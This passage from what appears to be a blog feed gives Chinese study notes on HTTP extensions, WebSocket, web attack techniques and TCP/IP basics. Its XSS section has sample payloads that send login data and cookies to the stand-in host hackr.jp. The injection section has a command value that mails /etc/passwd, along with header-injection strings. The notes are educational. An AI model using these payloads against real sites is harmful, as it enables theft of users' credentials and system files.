的解决方案：<ul><li>Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。然而，利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。</li><li>Comet 的解决方法：一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客 户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端 推送(Server Push)的功能。内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。</li></ul></li><li>SPDY 在协议级别消除 HTTP 的瓶颈，没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与传输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。使用 SPDY 后，HTTP 协议额外获得以下功能：<ul><li><strong>多路复用流</strong>，通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。</li><li><strong>赋予请求优先级</strong>，解决因带宽低而导致响应变慢的问题。</li><li><strong>压缩 HTTP 首部</strong>，减少数据包数量和发送的字节数。</li><li><strong>推送功能</strong>，服务器主动向客户端推送数据。</li><li><strong>服务器提示功能</strong>，服务器可以主动提示客户端请求所需的资源，在资源已缓存时可以避免发送不必要请求。</li></ul></li></ul></li><li><p><strong>WebSocket</strong> 全双工通信</p><ul><li><p>WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送 JSON、XML、HTML 或图片等任意格式的数据。WebSocket 协议的主要特点：</p><ul><li><strong>推送功能</strong>，支持由服务器向客户端推送数据的功能。</li><li><strong>减少通信量</strong>，和 HTTP 相比，不但每次连接时的总开销减少，首部信息很小所以通信量也相应减少了。</li></ul></li><li><p>为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”的步骤。</p><ul><li><p>握手 · 请求</p><p>为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变，以达到握手的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ&#x3D;&#x3D; </span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com </span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat </span><br><span class="line">Sec-WebSocket-Version: 13</span><br></pre></td></tr></table></figure><p><strong>Sec-WebSocket-Key</strong> 字段内记录着握手过程中必不可少的键值。</p><p><strong>Sec-WebSocket-Protocol</strong> 字段内记录使用的子协议。</p></li><li><p>握手 · 响应</p><p>对于之前的请求，返回状态码 <strong>101 Switching Protocols</strong> 的响应。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo&#x3D; </span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure><p><strong>Sec-WebSocket-Accept</strong> 的字段值是由握手请求中的 <strong>Sec-WebSocket-Key</strong> 的字段值生成的。</p><p>成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。</p></li></ul></li><li><p><strong>WebSocket API</strong></p><p>JavaScript 可调用由 W3C 标准制定的 <a href="http://www.w3.org/TR/websockets/" target="_blank" rel="noopener">The WebSocket API</a> 内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">'ws://game.example.com:12010/updates'</span>);</span><br><span class="line">socket.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (socket.bufferedAmount == <span class="number">0</span>)</span><br><span class="line">  socket.send(getUpdateData()); </span><br><span class="line">  &#125;, <span class="number">50</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>HTTP/2.0</strong></p><ul><li><p>HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验，通过以下协议为基础实现：</p><ul><li><strong>SPDY</strong></li><li><strong>HTTP Speed</strong> + <strong>Mobility</strong> 由微软公司起草，是用于改善并提高移动端通信时的通信速度和性能的标准，建立在 Google 公司提出的 SPDY 与 WebSocket 的基础之上。</li><li><strong>Network-Friendly HTTP Upgrade</strong> 主要是在移动端通信时改善 HTTP 性能的标准。</li></ul></li><li><p>HTTP/2.0 的 7 项技术及其讨论</p><table><thead><tr><th>技术</th><th>基础协议</th></tr></thead><tbody><tr><td>压缩</td><td>SPDY、Friendly</td></tr><tr><td>多路复用</td><td>SPDY</td></tr><tr><td>TLS 义务化</td><td>Speed + Mobility</td></tr><tr><td>协商</td><td>Speed + Mobility、Friendly</td></tr><tr><td>客户端拉拽/服务器推送</td><td>Speed + Mobility</td></tr><tr><td>流量控制</td><td>SPDY</td></tr><tr><td>WebSocket</td><td>Speed + Mobility</td></tr></tbody></table></li></ul></li></ol><ol start="4"><li><p><strong>WebDAV</strong> Web 服务器文件管理</p><ul><li><p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。</p></li><li><p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。</p></li><li><p>针对服务器上的资源，WebDAV 新增加了一些概念：</p><ul><li>集合(<strong>Collection</strong>)：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</li><li>资源(<strong>Resource</strong>)：把文件或集合称为资源。 </li><li>属性(<strong>Property</strong>)：定义资源的属性。定义以<strong>“</strong>名称 <strong>=</strong> 值<strong>”</strong>的格式执行。</li><li>锁(<strong>Lock</strong>)：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</li></ul></li><li><p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。</p><ul><li><strong>PROPFIND</strong> ：获取属性</li><li><strong>PROPPATCH</strong> ：修改属性</li><li><strong>MKCOL</strong> ：创建集合</li><li><strong>COPY</strong> ：复制资源及属性</li><li><strong>MOVE</strong> ：移动资源</li><li><strong>LOCK</strong> ：资源加锁</li><li><strong>UNLOCK</strong> ：资源解锁</li></ul></li><li><p>为配合扩展的方法，状态码也随之扩展。</p><ul><li><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</li><li><strong>207 Multi-Status</strong> ：存在多种状态</li><li><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误</li><li><strong>423 Locked</strong> ：资源已被加锁</li><li><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</li><li><strong>507 Insufficient Storage</strong> ：保存空间不足</li></ul></li></ul></li></ol><h3 id="构建-Web-内容的技术"><a href="#构建-Web-内容的技术" class="headerlink" title="构建 Web 内容的技术"></a>构建 Web 内容的技术</h3><ol><li><strong>HTML</strong> 是为了发送 Web 上的超文本 (Hypertext) 而开发的标记语言。<ul><li>HTML5 标准不仅解决了浏览器之间的兼容性问题，并且可把文本作为数据对待，更容易复用，动画等效果也变得更生动。</li><li>CSS 可以指定如何展现 HTML 内的各种元素，属于样式表标准之一。</li></ul></li><li><strong>动态 HTML</strong> 是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。<ul><li>DOM 是用以操作 HTML 文档和 XML 文档的 API(Application Programming Interface，应用编程接口)。</li><li>通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML 的改变。</li></ul></li><li><strong>Web 应用</strong> 是指通过 Web 功能提供的应用程序。<ul><li>其作用于由程序创建的动态内容之上。</li><li>CGI (Common Gateway Interface，通用网关接口) 是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。每次接到请求都要跟着启动一次，一旦访问量过大，Web 服务器要承担相当大的负载。</li><li>Servlet 是一种能在服务器上创建动态内容的程序，常驻内存，执行效率高，解决 CGI 问题。</li></ul></li><li>数据发布的格式及语言<ul><li>XML (eXtensible Markup Language，可扩展标记语言) 是一种可按应用目标进行扩展的通用标记语言。</li><li>RSS (简易信息聚合，也叫聚合内容) 和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。</li><li>JSON (JavaScript Object Notation) 是一种以 JavaScript (ECMAScript) 的对象表示法为基础的轻量级数据标记语 言。</li></ul></li></ol><h3 id="Web-攻击技术"><a href="#Web-攻击技术" class="headerlink" title="Web 攻击技术"></a>Web 攻击技术</h3><ol><li><p><strong>针对 Web 的攻击技术</strong></p><ul><li><p>在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击，通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入。针对 Web 应用的攻击模式：</p><ul><li>主动攻击，是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。有代表性的攻击是 SQL 注入攻击和 OS 命令注 入攻击。</li><li>被动攻击，是指利用圈套策略执行攻击代码的攻击模式，步骤如下：<ol><li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。</li><li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li><li>中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。</li><li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。</li></ol></li></ul></li><li><p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。</p></li></ul></li><li><p><strong>因输出值转义不完全引发的安全漏洞</strong></p><ul><li><p>实施 Web 应用的安全对策可大致分为以下两部分：</p><ul><li>客户端的验证</li><li>Web 应用端（服务器端）的验证<ul><li>输入值验证</li><li>输出值转义</li></ul></li></ul><p>多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。</p><p>从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p></li><li><p>跨站脚本攻击</p><p>跨站脚本攻击 (Cross-Site Scripting，XSS) 是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。跨站脚本攻击有可能造成以下影响：</p><ul><li>利用虚假输入表单骗取用户个人信息。</li><li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下， 帮助攻击者发送恶意请求。</li><li>显示伪造的文章或图片。</li></ul><p>示例1：（输入个人信息后发送到攻击者的网站）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID="&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+f=<span class="built_in">document</span>.getElementById(<span class="string">"login"</span>);+f.action=<span class="string">"http://hackr.jp/pwget"</span>;+f.method=<span class="string">"get"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">span+s="</span></span></span><br></pre></td></tr></table></figure><p>示例2：（获取该 Web 应用所处域名下的 Cookie 信息）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://hackr.jp/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xss.js</span></span><br><span class="line"><span class="keyword">var</span> content = <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie); </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;img src=http://hackr.jp/?"</span>); </span><br><span class="line"><span class="built_in">document</span>.write(content);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&gt;"</span>);</span><br></pre></td></tr></table></figure></li><li><p>SQL 注入攻击</p><ul><li><p>SQL 注入(SQL Injection)是指针对 Web 应用使用的数据库，通 过运行非法的 SQL 而产生的攻击。</p></li><li><p>示例：</p><p>地址栏的某参数会作为搜索功能的关键字，在该参数后加上<code>&#39;--&#39;</code>，会把后面的条件全视为注释。</p></li></ul></li><li><p>OS 命令注入攻击</p><ul><li><p>通过 Web 应用，执行非法的操作系统命令达到攻击的目的。</p></li><li><p>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表单中的核心代码，调用 sendmail 命令发送邮件，地址为 &amp;adr</span></span><br><span class="line">my $adr = $q-&gt;param(<span class="string">'mailaddress'</span>); </span><br><span class="line">open(MAIL, <span class="string">"| /usr/sbin/sendmail $adr"</span>); </span><br><span class="line">print MAIL <span class="string">"From: info@example.com\n"</span>;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 攻击者将地址指定为以下值</span></span><br><span class="line">; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure></li></ul></li><li><p>HTTP 首部注入攻击</p><ul><li><p>攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p></li><li><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 选择类别后，通过类别 ID 反映在响应内的 Location 首部字段内。类别后加上：</span><br><span class="line">101%0D%0ASet-Cookie:+SID=123456789</span><br></pre></td></tr></table></figure><p>其中 %0D%0A 代表 HTTP 报文中的换行符，攻击者可以修改任意的 Cookie 信息。</p></li><li><p>HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。</p></li></ul></li><li><p>邮件首部注入攻击</p><ul><li><p>%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 BCC(Blind Carbon Copy) 邮件地址的追加发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0ABcc: user@example.com</span><br></pre></td></tr></table></figure></li><li><p>另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本 内容并发送。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0A%0D%0ATest Message</span><br></pre></td></tr></table></figure></li></ul></li><li><p>目录遍历攻击</p><ul><li>是指对本无意公开的文件目录， 通过非法截断其目录路径后，达成访问目的的一种攻击。</li><li>可使用 …/ 等相对路径定位到 /etc/passed 等绝对路径上。</li></ul></li><li><p>远程文件包含漏洞</p><ul><li>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</li><li>主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说， 这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。外部文件可以通过 system 函数执行 OS 命令。</li></ul></li></ul></li><li><p><strong>因设置或设计上的缺陷引发的安全漏洞</strong></p><ul><li>强制浏览安全漏洞，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</li><li>不正确的错误消息处理，是指Web 应用的错误信息内包含对攻击者有用的信息。</li><li>开放重定向，是一种对指定的任意 URL 作重定向跳转的功能。</li></ul></li><li><p><strong>因会话管理疏忽引发的安全漏洞</strong></p><ul><li>会话劫持，是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</li><li>会话固定攻击，强制用户使用攻击者指定的会话 ID。</li><li>跨站点请求伪造，是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</li></ul></li><li><p><strong>其他安全漏洞</strong></p><ul><li><p>密码破解攻击，即算出密码，突破认证。包括：</p><ul><li>通过网络的密码试错：<ul><li>穷举法。</li><li>字典攻击，事先收集好候选密码来尝试通过验证。</li></ul></li><li>对已加密密码的破解：<ul><li>通过穷举法<strong>·</strong>字典攻击进行类推</li><li>彩虹表，由明文密码及与之对应的散列值构成 的一张数据库表</li><li>拿到密钥，共享密钥加密方式</li><li>加密算法的漏洞</li></ul></li></ul></li><li><p>点击劫持，利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。</p></li><li><p>DoS 攻击，是一种让运行中的服务呈停止状态的攻击，主要有以下两种：</p><ul><li>集中利用访问请求造成资源过载</li><li>通过攻击安全漏洞使服务停止</li></ul><p>多台计算机发起的 DoS 攻击称为 DDoS 攻击 (Distributed Denial of Service attack)。DDoS 攻击通常利用那些感染病毒的计算机作为攻 击者的攻击跳板。</p></li><li><p>后门程序，指开发设置的隐藏入口，可不按正常步骤使用受限功能。</p></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/.io//Storyboard.png&quot; alt=&quot;aaa&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Web-和网络基础&quot;&gt;&lt;a href=&quot;#Web-和网络基础&quot; class=&quot;headerlink&quot; title=&quot;Web 和网络基础&quot;&gt;&lt;/a&gt;Web 和网络基础
      
    
    </summary>
    
    
    
      <category term="Network" scheme="http://xsenyu.github.io/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>《图解 TCP/IP》知识点整理</title>
    <link href="http://xsenyu.github.io/2019/11/14/%E5%9B%BE%E8%A7%A3%20TCP:IP%20%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <id>http://xsenyu.github.io/2019/11/14/%E5%9B%BE%E8%A7%A3%20TCP:IP%20%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <published>2019-11-14T11:30:00.000Z</published>
    <updated>2020-04-06T08:55:16.121Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络基础知识"><a href="#网络基础知识" class="headerlink" title="网络基础知识"></a>网络基础知识</h3><ol><li><p>网络构成的要素：</p><ul><li><strong>网卡</strong>：使计算机连网</li><li><strong>中继器</strong>：从物理层上延长网络</li><li><strong>网桥（2层交换机）</strong>：从数据链路层上延长网络</li><li><strong>路由器（3层交换机）</strong>：通过网络层转发分组数据</li><li><strong>4～7层交换机</strong>：处理传输层以上各层网络传输</li><li><strong>网关</strong>：转换协议</li></ul></li><li><p>OSI 各个分层的主要作用：</p><ul><li><strong>应用层</strong>：为应用程序提供服务并规定应用程序中通信相关的细节。</li><li><strong>表示层</strong>：将设备固有的数据格式转换为网络标准传输格式。</li><li><strong>会话层</strong>：负责建立和断开通信连接，以及数据分割等传输相关的管理。</li><li><strong>传输层</strong>：在通信双方的节点上进行可靠传输。</li><li><strong>网络层</strong>：将数据传输到目标地址，主要负责寻址和路由选择。</li><li><strong>数据链路层</strong>：物理层面上互连的节点之间通信传输。</li><li><strong>物理层</strong>：负责比特流于电压高低、光的闪灭之间的转换。</li></ul></li><li><p>传输方式的分类</p><ul><li><strong>面向有连接型</strong>：ATM、帧中继、TCP</li><li><strong>面向无连接型</strong>：以太网、IP、UDP</li></ul></li><li><p>地址</p><ul><li><p>在同一通信网络中不允许有两个相同地址的通信主体存在</p></li><li><p>MAC 地址和 IP 地址都具有唯一性，但是只有 IP 地址具有层次性。MAC 地址是真正负责最终通信的地址，但实际寻址中，IP 地址必不可少。</p></li></ul></li></ol><h3 id="TCP-IP基础知识"><a href="#TCP-IP基础知识" class="headerlink" title="TCP/IP基础知识"></a>TCP/IP基础知识</h3><ol><li>传输中数据包，一部分由协议所要用到的首部，另一部分是上层传过来的数据，每个包首部包含两个信息：一个是发送端和接收端地址，另一个是上一层的协议类型。<ul><li><strong>TCP首部</strong>：源端口号、目标端口号、序号、以及校验和</li><li><strong>IP首部</strong>：接收端 IP 地址以及发送端 IP 地址</li><li><strong>以太网首部</strong>：接收端 MAC 地址、发送端 MAC 地址以及标志以太网类型的以太网数据的协议</li></ul></li></ol><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><ol><li>以太网前端有一个前导码，表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。前导码末尾有个SFD的域，它的值是“11”，前导码与 SFD 合起来占8个字节。</li><li>常见数据链路：以太网、802.11、蓝牙、PPP（Point-to-point Protocol）、ATM（Asynchronous Transfer Mode）、FDDI（Fiber Distributed Data Interface）、光线通道等。</li><li>不同数据链路的最大区别在于各自的最大传输单位（MTU）不同。</li></ol><h3 id="IP-协议"><a href="#IP-协议" class="headerlink" title="IP 协议"></a>IP 协议</h3><ol><li>IP 地址由 “网络标识“ 和 ”主机标识” 两部分组成。</li><li>IP 地址的分类：<ol><li><strong>A类地址</strong>：首位为“0”，从第 1 位到第 8 位是它的网络标识，后 24 位为主机标识，十进制表示位：0.0.0.0~127.0.0.0。</li><li><strong>B类地址</strong>：首位为“10”，从第 1 位到第 16 位是它的网络标识，后 16 位为主机标识，十进制表示位：128.0.0.0~191.255.0.0。</li><li><strong>C类地址</strong>：首位为“110”，从第 1 位到第 24 位是它的网络标识，后 8 位为主机标识，十进制表示位：192.0.0.0~223.255.255.0。</li><li><strong>D类地址</strong>：首位为“1110”，从第 1 位到第 32 位都是它的网络标识，没有主机标识，常用于多播，十进制表示位：224.0.0.0~239.255.255.255。</li></ol></li><li>广播地址：主机部分全部设置为1。</li><li>子网：将原来的A类、B类、C类等分类中的主机地址部分用作子网地址，可以将原网络分为多个物理网络的一种机制。对应网络标识部分全为1，主机标识部分全为0。</li><li>IPv6 地址的长度是原来的 4 倍，128 比特。</li></ol><h3 id="IP-协议相关技术"><a href="#IP-协议相关技术" class="headerlink" title="IP 协议相关技术"></a>IP 协议相关技术</h3><ol><li><p>DNS 查询流程：</p><ol><li>向 DNS 服务器查询 IP 地址；</li><li>DNS 服务器在自己的数据库查找，如果找不到就向上层根域名服务器请求查询，从根开始对域名树按照顺序进行遍历，知道找到制定的域名服务器；</li><li>上层域名服务器返回域名的 IP 地址给客户端；</li></ol></li><li><p>ARP 工作机制：通过广播发送一个 ARP 请求包，包含目标主机的 IP 地址，由于广播的包可以被同一个链路所有主机和路由器进行解析，因此目标主机也会对此请求包进行解析，如果 ARP 请求包中的目标地址和自己的 IP 地址一致，那么这个节点就将自己的 MAC 地址塞入 ARP 响应包中返回。</p></li><li><p>ICMP 主要功能包括，确认 IP 包是否成功送达目标地址，通知在发送过程中 IP 包被废弃的具体原因，改善网络设置等。</p></li><li><p>在网络层的首部后面继续追加网络层首部的通信方法叫做“IP 隧道”。</p></li><li><p>Mobile IP 技术让主机在所连接的子网 IP 发生变化时，主机的 IP 地址仍保持不变，通信能够继续。</p></li><li><p>DNS 解析过程：</p><ol><li>主机向本地域名服务器发起域名查询；</li><li>本地域名服务器不知道本查询的域名的 IP 地址，于是向根域名服务器发出查询请求报文；</li><li>根域名服务器返回顶级域名服务器的 IP 地址，本地域名服务器再向顶级域名服务器查询；</li><li>顶级域名服务器返回查询的 IP 地址，或者告知下一步应当向哪一个权限域名服务器进行查询；</li><li>本地域名服务器最终获得 IP 地址或者是出错的结果，返回给主机；</li></ol></li><li><p>ARP 工作流程：</p><p>主机 A 想要获取 主机 B 的 MAC 地址。</p><ol><li>主机 A 通过广播发送一个 ARP 请求包；</li><li>请求包被同一链路上所有主机或路由解析；</li><li>主机 B 解析请求包时发现目标 IP 地址与自己的 IP 一致，将自己的 MAC 地址塞入 ARP 响应包返回。</li></ol></li><li><p>NAT 的工作原理：</p><p>简单地说，NAT 就是在局域网内部网络中使用内部地址，而当内部节点要与外部网络进行通讯时，就在网关处，将内部地址替换成公用地址，从而在外部公网上正常使用。NAT 可被集成在路由器中，在其内部有一张自动生成的用来转换地址的表。</p></li></ol><h3 id="TCP-相关知识点"><a href="#TCP-相关知识点" class="headerlink" title="TCP 相关知识点"></a>TCP 相关知识点</h3><ol><li><p>TCP 通过序列号和确认应答（ACK）提高可靠性。</p><ul><li>发送端将数据发出后会等待对端的确认应答，如果一定时间内没有等到确认应答，发送端就可以认为数据已经丢失，并进行重发。</li><li>未收到确认应答可能是数据对方已经收到，只是返回的确认应答在途中丢失。这种情况会进行重发，目标主机会收到重复的数据，因此通过序列号标记一段数据，接收端查询接收数据 TCP 首部的序列号和数据长度，将自己的下一步应该接受的序号作为确认应答返送回去，实现可靠传输。</li><li>重发超时的确定。TCP 每次发包时都会计算往返时间（RTT）及其波动的偏差，将往返时间和偏差相加，重发超时的时间就是比这个总和稍大一点的值。</li><li>重发到了一定次数，如果没有任何确认应答返回，就会判断为网络或对端主机发生异常，强制关闭连接。</li></ul></li><li><p>TCP 利用窗口控制提高速度</p><ul><li>发送端主机在发送了一个段以后，不会一直等待确认应答，而是继续发送，从而缩短转发时间。</li><li>窗口大小指无需等待确认应答而可以继续发送数据的最大值。</li><li>如果窗口中部分数据出现丢包，发送端会设置缓存保留这些数据，直到收到他们的确认应答。</li><li><strong>窗口控制</strong>：窗口在一定程度较大时，即使有少部分的确认应答丢失也不会进行重发，可以通过下一个确认应答来确认。</li><li><strong>高速重发控制</strong>（<strong>快重传</strong>）：在窗口比较大，又出现报文段丢失的情况下，接收端没有收到自己期望序号的数据时，会对之前收到的数据进行确认应答，发送端主机如果连续 3 次收到同一个确认应答，就会将对应数据进行重发。其他数据发送数据放入队列，待重传结束后再正常传输。</li><li><strong>流控制</strong>：TCP 首部有个字段用来通知窗口大小，接收主机将自己可以接受的缓冲区大小放入字段中通知发送端。</li><li>接收端缓冲区快满了，会暂停接收数据，直到发出一个更新通知后通信才得以继续。</li><li>如果更新通知丢失了，过了重发超时的时间以后，发送端会时不时发送窗口探测的数据段，仅含一个字节以获取最新的窗口大小，从而保证通信能继续。</li></ul></li><li><p>拥塞控制</p><ul><li>TCP 为了防止通信开始时就发送大量数据，使用了一种慢启动的算法，通过拥塞窗口（cwnd）调节数据发送量。</li><li><strong>慢启动</strong>时，将拥塞窗口大小设置为 1 MSS，之后每收到一次确认应答（ACK），拥塞窗口的值就加 1。</li><li>发送数据包时，将拥塞窗口的大小与接收端主机通知的窗口大小做比较，取较小值作为最大发送量。</li><li>为防止每次包的往后拥塞窗口以指数函数增长，引入慢启动阈值（ssthresh）。<ol><li><strong>拥塞避免</strong>：当窗口指数增大导致<strong>超时重发</strong>时，就会设置阈值为当前拥塞窗口的一半，窗口重新设置为 1。当窗口再次增大到超出这个阈值后，拥塞窗口按这个比例放大：1 个数据段的字节数 / 拥塞窗口（字节）* 1 个 数据段字节数，丈夫会逐渐呈直线上升趋势。</li><li><strong>快恢复</strong>：而由重复确认应答进行<strong>高速重发</strong>控制时，慢启动阈值被设置为当前窗口大小的一半，窗口大小设置为慢启动阈值+3个数据段的大小，继续直线上升。</li></ol></li></ul></li><li><p>延迟确认应答是能够提高网络利用率从而降低计算机处理负荷的一种较优的处理机制。</p><ul><li>在没有收到 2x最大段长度的数据为止不做确认应答。（有的操作系统是收到两个包就即可返回）</li><li>其他情况下，最大延迟 0.5 秒发送确认应答。（有的操作系统设置为 0.2 秒左右）</li></ul></li><li><p>为什么建立握手三次连接，断开握手四次连接。</p><p>TCP 是一个双向的连接，服务端和客户端双方都有发送和接收数据的能力，因此双方都需要获得对方确认号，从而进入<code>ESTABLISHED</code>状态。</p><ol><li>进入<code>ESTABLISHED</code>状态首先需要向对方发起同步序列包（SYN），对方收到后返回一个确认包（ACK）。</li><li>因此最简单的双方建立连接是经过四次的握手才建立的：1.客户端发送 <code>SYN</code>包；2. 服务端返回 <code>ACK</code> 包；3. 服务端发送 